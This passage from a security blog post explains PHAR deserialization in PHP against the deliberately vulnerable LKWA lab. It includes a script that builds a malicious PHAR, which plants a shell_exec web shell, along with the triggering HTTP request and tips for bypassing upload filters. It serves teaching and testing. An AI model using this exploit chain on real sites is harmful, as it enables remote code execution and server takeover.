        echo "File is not a PHAR file.";
        $uploadOk = 0;
    }
}
// Check if file already exists
if (file_exists($target_file)) {
    echo "Sorry, file already exists.";
    $uploadOk = 0;
}

// Allow certain file formats
if($imageFileType != "phar") {
    echo "Sorry, only PHAR file is allowed.";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
    echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}
?&gt;
</code></pre>
</div>
<p><em>https://github.com/weev3/LKWA/blob/master/phar_deserial/upload.php</em></p>

<p>This above code checks if a given upload is a phar file, the <code class="highlighter-rouge">file_exists</code> function is also used to see if the file has already been uploaded. Aftr the checks, the file is uploaded. This functionality can be used to upload a PHAR file.</p>

<p>Within <code class="highlighter-rouge">phar_deserial.php</code>, the following code can be seen:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>include("sidebar.php");

class log
{
	public $filename="log.txt";
	public $data="log";
    function __wakeup(){
        file_put_contents($this-&gt;filename, $this-&gt;data);
    }
}

if (file_exists($_GET['file'])) {
 $var = new log();
}
</code></pre>
</div>
<p><em>https://github.com/weev3/LKWA/blob/master/phar_deserial/phar_deserial.php</em></p>

<p>Since the <code class="highlighter-rouge">file_exists($_GET['file']</code> function is used with a user provided input. It is possible to set the value of the input to the previously uploaded Phar file. Example: <code class="highlighter-rouge">phar://../uploads/phar_file.phar</code>. The PHP application will perform a filesystem call on the provided wrapper, such as verifying if the file exists on the disk by calling <code class="highlighter-rouge">file_exists("phar://../uploads/phar_file.phar")</code>. and the Phar‚Äôs metadata will be unserialized, taking advantage of the gadgets/POP chains to complete the exploitation chain. In this instance, the <code class="highlighter-rouge">__wakeup</code> magic method can be leveraged for code execution by writing some PHP code and calling it.</p>

<p>The following code can be used to create a PHAR file</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php
class log
{
    
    function __wakeup(){
    }
}

$payload = new log();
$payload-&gt;filename = 'shell.php5';
$payload-&gt;data = "&lt;?php echo shell_exec(\$_GET['e'].' 2&gt;&amp;1'); ?&gt;";
var_dump($payload);

// create new Phar
@unlink("payload.phar");
$phar = new Phar('payload.phar');
$phar-&gt;startBuffering();
$phar-&gt;addFromString('test.txt', 'text');
$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');
//set payload
$phar-&gt;setMetadata($payload);
$phar-&gt;stopBuffering();
?&gt;
</code></pre>
</div>

<p>This phar file can be uploaded using <code class="highlighter-rouge">upload.php</code>.</p>

<p><img src="/assets/phpi/4.png" alt="" /></p>

<p>This <code class="highlighter-rouge">payload.phar</code> can be called through the <code class="highlighter-rouge">phar_deserial.php</code> file.</p>

<div class="highlighter-rouge"><pre class="highlight"><code>GET /phar_deserial/phar_deserial.php?file=phar%3a%2f%2fpharfile.phar HTTP/1.1
Host: lkwa.local:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: username=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3B%7D
Upgrade-Insecure-Requests: 1
</code></pre>
</div>

<p>To test if things are working locally, you can testing using a code such as</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php

class log
{
	public $filename="log.txt";
	public $data="log";
    function __wakeup(){
        file_put_contents($this-&gt;filename, $this-&gt;data);
    }
}

// output: rips
include('phar://payload.phar');


?&gt;
</code></pre>
</div>

<h3 id="phar-deserialization-real-world-vulnerabilities">Phar Deserialization Real World Vulnerabilities</h3>

<ul>
  <li><a href="https://github.com/dompdf/dompdf/pull/1903">DomPDF Phar Serialization</a></li>
  <li><a href="https://www.exploit-db.com/exploits/46634">LimeSurvey &lt; 3.16 - Remote Code Execution</a></li>
  <li><a href="https://github.com/mpdf/mpdf/issues/949">mpdf Insecure PHP deserialization through phar:// wrapper</a></li>
  <li><a href="https://github.com/pear/Archive_Tar/issues/33">TCPDF Phar Deserialization</a></li>
  <li><a href="https://blog.ripstech.com/2018/phpbb3-phar-deserialization-to-remote-code-execution/">phpbb3 Phar Deserialization</a></li>
  <li><a href="https://www.exploit-db.com/exploits/46108">PEAR Archive_Tar1</a></li>
</ul>

<h3 id="useful-notes-1">Useful Notes</h3>
<ul>
  <li>Inclusion of the Phar file for deserialization can be local or remote</li>
  <li>If a file upload functionality only allows jpg, you can use a phar-jpg polyglot: https://github.com/kunte0/phar-jpg-polyglot</li>
  <li>If you are trying to leverage a __destruct magic method as part of your POP chain and the if destructor is never called, you can use ‚Äúfast destruct method‚Äù in PHPGGC to make sure it‚Äôs called right after the unserialize. The -f option with PHPGGC will place your popchain in an array and overwrite its entry with another value, losing the only reference to your instance.</li>
</ul>

<h3 id="references">References</h3>
<ul>
  <li><a href="https://blog.ripstech.com/2018/new-php-exploitation-technique/">https://blog.ripstech.com/2018/new-php-exploitation-technique/</a></li>
  <li><a href="https://www.drupal.org/sa-core-2020-013">https://www.drupal.org/sa-core-2020-013</a></li>
  <li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></li>
  <li><a href="https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066">https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066</a></li>
  <li><a href="https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It‚Äôs-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></li>
  <li><a href="https://blog.certimetergroup.com/it/articolo/security/polyglot_phar_deserialization_to_rce">https://blog.certimetergroup.com/it/articolo/security/polyglot_phar_deserialization_to_rce</a></li>
</ul>

</article>





<section class="rss">
  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
</section>

<section class="share">
  <span>Share: </span>
  
    
    
      <a href="//twitter.com/share?text=PHP+Object+Injection+Exploitation+Notes&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2021%2F01%2F08%2F02_php_object_injection_exploitation-notes.html&via=snoopysecurity"
        onclick="window.open(this.href, 'twitter-share', 'width=550,height=255');return false;">
        <i class="fa fa-twitter-square fa-lg"></i>
      </a>
    
    
    
    
    
    
    
  
    
    
    
      <a href="//www.facebook.com/sharer.php?t=PHP+Object+Injection+Exploitation+Notes&u=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2021%2F01%2F08%2F02_php_object_injection_exploitation-notes.html"
        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
        <i class="fa fa-facebook-square fa-lg"></i>
      </a>
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
      <a href="//www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2021%2F01%2F08%2F02_php_object_injection_exploitation-notes.html"
        onclick="window.open(this.href, 'linkedin-share', 'width=550,height=255');return false;">
        <i class="fa fa-linkedin-square fa-lg"></i>
      </a>
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
      <a href="//www.pinterest.com/pin/create/button/?description=PHP+Object+Injection+Exploitation+Notes&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fweb-application-security%2F2021%2F01%2F08%2F02_php_object_injection_exploitation-notes.html&media=http://snoopysecurity.github.io/assets/header_img.jpg"
        onclick="window.open(this.href, 'pinterest-share', 'width=550,height=255');return false;">
        <i class="fa fa-pinterest-square fa-lg"></i>
      </a>
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
</section>




</div>
</div>

    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <h3 class="footer-heading">üíª | Blog</h3>

    <div class="site-navigation">

      <p><strong>Site Map</strong></p>
      <ul class="pages">
        
        
          <li class="nav-link"><a href="/about/">About</a>
        
        
        
        
        
        
        
        
        
          <li class="nav-link"><a href="/posts/">Posts</a>
        
        
        
        
        
        
        
        
        
        
        
        
      </ul>
    </div>

    <div class="site-contact">

      <p><strong>Contact</strong></p>
      <ul class="social-media-list">
        <li>
          <a href="mailto:na">
            <i class="fa fa-envelope-o"></i>
            <span class="username">na</span>
          </a>
        </li>

        
          
          <li>
            <a href="https://twitter.com/snoopysecurity" title="Follow me on Twitter">
              <i class="fa fa-twitter"></i>
              <span class="username">snoopysecurity</span>
            </a>
          </li>
          
        
          
        
          
          <li>
            <a href="https://github.com/snoopysecurity" title="Fork me on GitHub">
              <i class="fa fa-github"></i>
              <span class="username">snoopysecurity</span>
            </a>
          </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        

      </ul>
    </div>

    <div class="site-signature">
      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
      <p class="text">Hacking to learn, while learning to hack.
</p>
    </div>

  </div>

</footer>

<!-- Scripts -->
<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>

<script type="text/javascript">
$(document).ready(function() {
  // Default syntax highlighting
  hljs.initHighlightingOnLoad();

  // Header
  var menuToggle = $('#js-mobile-menu').unbind();
  $('#js-navigation-menu').removeClass("show");
  menuToggle.on('click', function(e) {
    e.preventDefault();
    $('#js-navigation-menu').slideToggle(function(){
      if($('#js-navigation-menu').is(':hidden')) {
        $('#js-navigation-menu').removeAttr('style');
      }
    });
  });
});

</script>






  </body>

</html>
